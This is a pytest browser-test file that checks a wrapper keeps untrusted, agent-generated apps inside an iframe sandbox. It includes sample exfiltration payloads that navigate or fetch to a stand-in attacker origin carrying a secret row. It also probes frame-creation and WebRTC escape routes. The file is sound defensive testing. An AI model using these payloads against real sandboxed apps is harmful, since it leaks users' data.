"""Browser regression tests for the MiniApp sandbox.

An app page is agent-generated and therefore untrusted. CSP does not cover
navigation, so an app that navigates its own frame leaves the sandbox; the
sandbox flags survive that navigation and the origin stays opaque, so the
host's ``event.source`` check still accepts the escaping page and it inherits
the bridge — it can then read every row through the host.

The wrapper document fixes this by embedding the app one level deeper: a child
frame's navigation is checked against its embedder's ``frame-src``, and the
wrapper declares ``frame-src 'none'``.

These tests drive a real browser because the property under test is a browser
behaviour, not a string check. They skip when no browser is installed.
"""

from __future__ import annotations

import os
import threading
from collections.abc import Iterator
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

from octop.infra.apps.sandbox import WEBRTC_FREEZE, build_wrapper_doc


def _frozen_app(body: str) -> str:
    """Freeze script + app content, bypassing the static frame rejection.

    The freeze's runtime guards are tested independently of the write/render
    checks; those have their own tests.
    """
    return (
        "<!doctype html><html>"
        f"<script>{WEBRTC_FREEZE}</script>"
        f"<head></head><body>{body}</body></html>"
    )


# The dashboard renders the app inside the wrapper; the public page does the
# same through the server-rendered host. Both use the same structure.
HOST_PAGE = """<!doctype html>
<html><body>
<iframe id="wrapper" sandbox="allow-scripts"></iframe>
<script>
window.__messages = [];
window.addEventListener("message", function (event) {
  window.__messages.push(event.data);
});
window.__load = function (html) {
  document.getElementById("wrapper").srcdoc = html;
};
</script></body></html>"""


class _EvilHandler(BaseHTTPRequestHandler):
    """Records any request that reaches the attacker-controlled origin."""

    hits: list[str] = []

    def do_GET(self) -> None:  # noqa: N802 - http.server API
        type(self).hits.append(self.path)
        body = b"<html><body>attacker</body></html>"
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args: object) -> None:
        pass


@pytest.fixture(scope="module")
def evil_server() -> Iterator[str]:
    """A local origin the app must never be able to reach."""
    _EvilHandler.hits = []
    server = ThreadingHTTPServer(("127.0.0.1", 0), _EvilHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}"
    finally:
        server.shutdown()
        server.server_close()


def _chromium_path() -> str | None:
    """Locate a Chromium build, or None when none is installed."""
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        return None

    with sync_playwright() as p:
        expected = Path(p.chromium.executable_path)
        if expected.exists():
            return str(expected)
        # The pinned Playwright version may not match the installed browser
        # build; fall back to any Chromium in the cache directory.
        root = expected.parents[2] if len(expected.parents) > 2 else None
        if root is None or not root.is_dir():
            return None
        candidates = [
            path for path in root.glob("chromium-*/chrome-linux64/chrome") if path.exists()
        ]
        if not candidates:
            candidates = [
                path for path in root.glob("chromium-*/chrome-win/chrome.exe") if path.exists()
            ]
        return str(sorted(candidates)[-1]) if candidates else None


@pytest.fixture(scope="module")
def browser_path() -> str:
    path = _chromium_path()
    if not path:
        pytest.skip("no Chromium build available for the sandbox regression test")
    return path


def _app_html(evil_url: str, escape: str) -> str:
    """An app that reads a row from the bridge and then tries to leave."""
    if escape == "location":
        # Immediate navigation: the hardest case to observe, because the
        # browser never completes a second load for it.
        payload = f'location.href = "{evil_url}/leak?d=SECRET-ROW-1";'
        refresh = ""
    elif escape == "location-delayed":
        payload = (
            f'setTimeout(function(){{location.href = "{evil_url}/leak?d=SECRET-ROW-1";}}, 200);'
        )
        refresh = ""
    elif escape == "meta":
        payload = ""
        refresh = f'<meta http-equiv="refresh" content="0;url={evil_url}/leak-meta">'
    else:  # pragma: no cover - guarded by the caller
        raise ValueError(escape)

    return (
        "<!doctype html><html><head><title>app</title>"
        f"{refresh}</head><body><h1>app</h1><script>"
        "parent.postMessage({source:'octop-app',type:'request',id:1,"
        "method:'rows',params:{}}, '*');"
        f"{payload}"
        "</script></body></html>"
    )


def _run(
    browser_path: str,
    evil_url: str,
    escape: str,
    *,
    wrapped: bool,
) -> tuple[list[str], list[dict]]:
    """Load the app and report what reached the attacker and the host."""
    from playwright.sync_api import sync_playwright

    _EvilHandler.hits = []
    app_html = _app_html(evil_url, escape)

    with sync_playwright() as p:
        browser = p.chromium.launch(executable_path=browser_path)
        try:
            page = browser.new_page()
            page.set_content(HOST_PAGE)
            if wrapped:
                # The production structure: the app runs inside the wrapper.
                page.evaluate(
                    "(html) => window.__load(html)",
                    build_wrapper_doc(app_html),
                )
            else:
                # The old structure: the app runs directly in the frame.
                page.evaluate(
                    "(html) => window.__load(html)",
                    app_html,
                )
            page.wait_for_timeout(1500)
            messages = page.evaluate("window.__messages")
        finally:
            browser.close()

    hits = list(_EvilHandler.hits)
    return hits, [m for m in messages if isinstance(m, dict)]


@pytest.mark.parametrize("escape", ["location", "location-delayed", "meta"])
def test_wrapped_app_cannot_reach_an_external_origin(
    browser_path: str, evil_server: str, escape: str
) -> None:
    """The wrapper keeps the app's data from leaving through a navigation.

    The guarantee is that no request reaches the attacker. For a *delayed*
    navigation or a meta refresh the wrapper also notices the attempt and
    tells the host. An immediate navigation is blocked before a second
    document exists, so the tripwire has no load event to observe — the
    network assertion is what matters there.
    """
    hits, messages = _run(browser_path, evil_server, escape, wrapped=True)

    assert hits == [], f"app reached the attacker origin: {hits}"
    if escape != "location":
        assert any(m.get("type") == "escaped" for m in messages), messages


def test_unwrapped_app_can_leave_the_frame(browser_path: str, evil_server: str) -> None:
    """Control: without the wrapper the escape succeeds.

    This guards the test itself: if the harness could not detect an escape,
    the passing test above would prove nothing.
    """
    hits, _messages = _run(browser_path, evil_server, "location", wrapped=False)

    assert hits, "the unwrapped app was expected to reach the attacker origin"
    assert any("SECRET-ROW-1" in hit for hit in hits), hits


def test_wrapper_reports_ready_for_a_normal_app(browser_path: str) -> None:
    """A well-behaved app still loads and the host is told it is ready."""
    from playwright.sync_api import sync_playwright

    app_html = (
        "<!doctype html><html><head><title>app</title></head><body>"
        "<h1 id='t'>hello</h1>"
        "<script>parent.postMessage({source:'octop-app',type:'request',id:1,"
        "method:'rows',params:{}}, '*');</script>"
        "</body></html>"
    )

    with sync_playwright() as p:
        browser = p.chromium.launch(executable_path=browser_path)
        try:
            page = browser.new_page()
            page.set_content(HOST_PAGE)
            page.evaluate("(html) => window.__load(html)", build_wrapper_doc(app_html))
            page.wait_for_timeout(800)
            messages = page.evaluate("window.__messages")
        finally:
            browser.close()

    kinds = [m.get("type") for m in messages if isinstance(m, dict)]
    assert "ready" in kinds, messages
    # The app's own request still reaches the host through the relay.
    assert any(m.get("source") == "octop-app" and m.get("method") == "rows" for m in messages), (
        messages
    )
    assert not any(m.get("type") == "escaped" for m in messages), messages


def test_wrapper_still_allows_inline_images(browser_path: str) -> None:
    """The wrapper's inherited CSP must not break data: images.

    A srcdoc child inherits its embedder's policy, so a wrapper that only
    carried `default-src 'none'` would silently block every inline image,
    font and media element the app relies on.
    """
    from playwright.sync_api import sync_playwright

    png = (
        "data:image/png;base64,"
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8"
        "/x8AAusB9Y9Zl1sAAAAASUVORK5CYII="
    )
    app_html = (
        "<!doctype html><html><head><title>app</title></head><body>"
        f"<img id='i' src='{png}'>"
        "<script>"
        "var img=document.getElementById('i');"
        "function report(s){parent.postMessage({source:'octop-app',type:'probe',img:s},'*');}"
        "if(img.complete){report(img.naturalWidth>0?'loaded':'error');}"
        "else{img.onload=function(){report('loaded');};"
        "img.onerror=function(){report('error');};}"
        "</script></body></html>"
    )

    with sync_playwright() as p:
        browser = p.chromium.launch(executable_path=browser_path)
        try:
            page = browser.new_page()
            page.set_content(HOST_PAGE)
            page.evaluate("(html) => window.__load(html)", build_wrapper_doc(app_html))
            page.wait_for_timeout(800)
            messages = page.evaluate("window.__messages")
        finally:
            browser.close()

    probes = [m for m in messages if isinstance(m, dict) and m.get("type") == "probe"]
    assert probes, messages
    assert probes[-1].get("img") == "loaded", probes


def test_wrapper_relays_csp_violations(browser_path: str) -> None:
    """The browser emits `securitypolicyviolation`; the host must receive it."""
    from playwright.sync_api import sync_playwright

    app_html = (
        "<!doctype html><html><head><title>app</title></head><body>"
        "<script>"
        "window.addEventListener('securitypolicyviolation', function (e) {"
        "parent.postMessage({source:'octop-app', type:'violation',"
        "directive:e.violatedDirective, blockedURI:e.blockedURI}, '*');"
        "});"
        "fetch('https://example.invalid/leak').catch(function () {});"
        "</script></body></html>"
    )

    with sync_playwright() as p:
        browser = p.chromium.launch(executable_path=browser_path)
        try:
            page = browser.new_page()
            page.set_content(HOST_PAGE)
            page.evaluate("(html) => window.__load(html)", build_wrapper_doc(app_html))
            page.wait_for_timeout(800)
            messages = page.evaluate("window.__messages")
        finally:
            browser.close()

    violations = [m for m in messages if isinstance(m, dict) and m.get("type") == "violation"]
    assert violations, messages
    assert "connect-src" in violations[0].get("directive", ""), violations


def test_freeze_disables_webrtc_before_app_scripts(browser_path: str) -> None:
    """The freeze runs first; the app sees no usable RTC constructor."""
    from playwright.sync_api import sync_playwright

    app_html = (
        "<!doctype html><html><head><title>app</title></head><body>"
        "<script>"
        "var out = {};"
        "out.before = typeof RTCPeerConnection;"
        "out.proto = typeof Object.getPrototypeOf(window).RTCPeerConnection;"
        "try { out.deleted = (delete window.RTCPeerConnection) + ':' + typeof window.RTCPeerConnection; }"
        "catch (e) { out.deleted = 'ERR:' + e.name; }"
        "try { document.createElement('iframe'); out.iframe = 'created'; }"
        "catch (e) { out.iframe = 'blocked'; }"
        "out.worker = typeof Worker;"
        "out.shared = typeof SharedWorker;"
        "out.transport = typeof WebTransport;"
        "out.sw = typeof navigator.serviceWorker;"
        "function attempt(fn) { try { fn(); return 'created'; } catch (e) { return 'blocked'; } }"
        "out.setHTMLUnsafe = typeof document.body.setHTMLUnsafe === 'function'"
        "  ? attempt(function () { document.body.setHTMLUnsafe('<iframe srcdoc=\"x\"></iframe>'); })"
        "  : 'unavailable';"
        "out.exec = typeof document.execCommand === 'function'"
        "  ? attempt(function () { document.execCommand('insertHTML', false, '<iframe srcdoc=\"x\"></iframe>'); })"
        "  : 'unavailable';"
        "out.parse = typeof Document.parseHTMLUnsafe === 'function'"
        "  ? attempt(function () { Document.parseHTMLUnsafe('<iframe srcdoc=\"x\"></iframe>'); })"
        "  : 'unavailable';"
        "parent.postMessage({source:'octop-app', type:'freeze', out:out}, '*');"
        "</script></body></html>"
    )

    with sync_playwright() as p:
        browser = p.chromium.launch(executable_path=browser_path)
        try:
            page = browser.new_page()
            page.set_content(HOST_PAGE)
            page.evaluate(
                "(html) => window.__load(html)",
                build_wrapper_doc(_frozen_app(app_html)),
            )
            page.wait_for_timeout(800)
            messages = page.evaluate("window.__messages")
        finally:
            browser.close()

    probes = [m for m in messages if isinstance(m, dict) and m.get("type") == "freeze"]
    assert probes, messages
    out = probes[0]["out"]
    assert out["before"] == "undefined", out
    assert out["proto"] == "undefined", out
    assert out["deleted"].startswith("false"), out
    assert out["iframe"] == "blocked", out
    assert out["worker"] == "undefined", out
    assert out["shared"] == "undefined", out
    assert out["transport"] == "undefined", out
    assert out["sw"] == "undefined", out
    for key in ("setHTMLUnsafe", "exec", "parse"):
        assert out[key] in {"blocked", "unavailable"}, out


def test_freeze_removes_a_static_nested_frame(browser_path: str) -> None:
    """A nested srcdoc frame gets a fresh realm; the freeze must remove it."""
    from playwright.sync_api import sync_playwright

    app_html = (
        "<!doctype html><html><head><title>app</title></head><body>"
        "<iframe id='n' srcdoc=\"<script>parent.postMessage({type:'nested'}, '*')\"></iframe>"
        "<script>"
        "window.addEventListener('message', function (e) {"
        "  if (e.data && e.data.type === 'nested') {"
        "    parent.postMessage({source:'octop-app', type:'nested-relay'}, '*');"
        "  }"
        "});"
        "setTimeout(function () {"
        "  parent.postMessage({source:'octop-app', type:'frame-check',"
        "    gone: !document.getElementById('n')}, '*');"
        "}, 250);"
        "</script></body></html>"
    )

    with sync_playwright() as p:
        browser = p.chromium.launch(executable_path=browser_path)
        try:
            page = browser.new_page()
            page.set_content(HOST_PAGE)
            page.evaluate(
                "(html) => window.__load(html)",
                build_wrapper_doc(_frozen_app(app_html)),
            )
            page.wait_for_timeout(1000)
            messages = page.evaluate("window.__messages")
        finally:
            browser.close()

    kinds = [m.get("type") for m in messages if isinstance(m, dict)]
    assert "nested-relay" not in kinds, messages
    checks = [m for m in messages if isinstance(m, dict) and m.get("type") == "frame-check"]
    assert checks and checks[-1]["gone"] is True, messages


def test_freeze_blocks_inner_html_frames(browser_path: str) -> None:
    """innerHTML/document.write are common ways to create a frame dynamically."""
    from playwright.sync_api import sync_playwright

    app_html = (
        "<!doctype html><html><head><title>app</title></head><body>"
        "<script>"
        "var out = {};"
        "try { document.body.innerHTML = '<iframe srcdoc=\"x\"></iframe>'; out.html = 'created'; }"
        "catch (e) { out.html = 'blocked'; }"
        "try { document.write('<iframe srcdoc=\"x\"></iframe>'); out.write = 'created'; }"
        "catch (e) { out.write = 'blocked'; }"
        "parent.postMessage({source:'octop-app', type:'frame-check2', out:out}, '*');"
        "</script></body></html>"
    )

    with sync_playwright() as p:
        browser = p.chromium.launch(executable_path=browser_path)
        try:
            page = browser.new_page()
            page.set_content(HOST_PAGE)
            page.evaluate(
                "(html) => window.__load(html)",
                build_wrapper_doc(_frozen_app(app_html)),
            )
            page.wait_for_timeout(800)
            messages = page.evaluate("window.__messages")
        finally:
            browser.close()

    probes = [m for m in messages if isinstance(m, dict) and m.get("type") == "frame-check2"]
    assert probes, messages
    assert probes[0]["out"] == {"html": "blocked", "write": "blocked"}, probes


def test_wrapper_escapes_a_script_tag_in_the_app() -> None:
    """A script tag in the app must not close the wrapper's own script."""
    app_html = "<html><body><script>window.x=1</script></body></html>"
    doc = build_wrapper_doc(app_html)
    assert "</script>window.x=1</script>" not in doc
    assert "<\\/script>" in doc


@pytest.mark.skipif(os.name == "nt", reason="POSIX-only path check")
def test_wrapper_uses_a_relative_path_free_document() -> None:
    """The wrapper must not reference any local path."""
    doc = build_wrapper_doc("<html></html>")
    assert "/home/" not in doc
    assert "C:\\" not in doc
